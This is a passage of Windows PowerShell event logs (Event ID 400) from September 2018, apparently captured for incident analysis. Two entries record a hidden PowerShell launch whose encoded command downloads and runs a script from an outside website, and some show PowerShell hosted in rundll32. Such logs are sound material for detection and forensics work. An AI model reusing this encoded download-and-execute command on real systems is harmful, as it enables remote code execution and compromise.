"TimeCreated","Details","EventID"
"9/6/2018 11:20:19 PM","	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=11020f84-5c63-402f-8eff-299ecdde31d7
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.547
	RunspaceId=fd302d68-58aa-47b0-9e5d-e132b6bbd0b0
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","400"
"9/6/2018 10:31:01 PM","	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=d0bdac4b-d6a1-42f1-a8a0-bb88b570151a
	HostApplication=c:\windows\syswow64\windowspowershell\v1.0\powershell.exe -Version 5.1 -s -NoLogo -NoProfile
	EngineVersion=5.1.16299.547
	RunspaceId=4fe8ce7b-f0da-4253-a22c-8e8aa1ea2c81
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","400"
"9/6/2018 10:31:00 PM","	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.16299.547
	HostId=b0503f5c-bd85-48fb-aa42-4cb29bc413b6
	HostApplication=powershell -W Hidden -nop -noni -ec SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBzAHEAdQBpAHIAcgBlAGwAZABpAHIAZQBjAHQAbwByAHkALgBjAG8AbQAvAGEAJwApAAoA
	EngineVersion=5.1.16299.547
	RunspaceId=597192c2-24af-4041-87d0-cea89fa5bd46
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","400"
"9/6/2018 10:30:08 PM","	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=5480a35d-d000-46d4-a994-d46aae0656a9
	HostApplication=c:\windows\syswow64\windowspowershell\v1.0\powershell.exe -Version 5.1 -s -NoLogo -NoProfile
	EngineVersion=5.1.16299.547
	RunspaceId=be1c4add-6f80-4fb7-9b1f-0383d9728cfb
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","400"
"9/6/2018 10:30:02 PM","	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.16299.547
	HostId=c913700e-4eee-40ed-8f62-64ee3d8719c7
	HostApplication=powershell -W Hidden -nop -noni -ec SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBzAHEAdQBpAHIAcgBlAGwAZABpAHIAZQBjAHQAbwByAHkALgBjAG8AbQAvAGEAJwApAAoA
	EngineVersion=5.1.16299.547
	RunspaceId=7ed97daa-7ea5-45b4-8c97-378d5d6b3d66
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","400"
"9/6/2018 7:26:32 PM","	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=17

	HostName=ConsoleHost
	HostVersion=1.0
	HostId=ac974e29-6dff-45d1-a025-be7b47d54066
	HostApplication=C:\WINDOWS\system32\rundll32.exe
	EngineVersion=5.1.16299.547
	RunspaceId=b13bf80c-a30f-4295-87c8-dc7659c82e2e
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","400"
"9/6/2018 4:58:42 PM","	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=17

	HostName=ConsoleHost
	HostVersion=1.0
	HostId=ef6cd434-cedc-4962-af75-a7679eac5567
	HostApplication=C:\WINDOWS\system32\rundll32.exe
	EngineVersion=5.1.16299.547
	RunspaceId=ec0f0c1b-9fe9-4adf-8217-00e5ffc4a08b
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","400"
"9/6/2018 3:40:37 PM","	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=be5b2c2e-be18-47bc-81f0-35a1afaf7228
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.547
	RunspaceId=437c9179-6d27-4d76-b3bd-98c585ebf496
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","400"
"9/6/2018 3:09:13 PM","	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=bf64d975-c396-48e4-b9b0-36b1e6b773ea
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.547
	RunspaceId=72099b4b-9acf-4cde-af39-f2ec920c98a9
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","400"
"9/5/2018 3:38:47 PM","	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

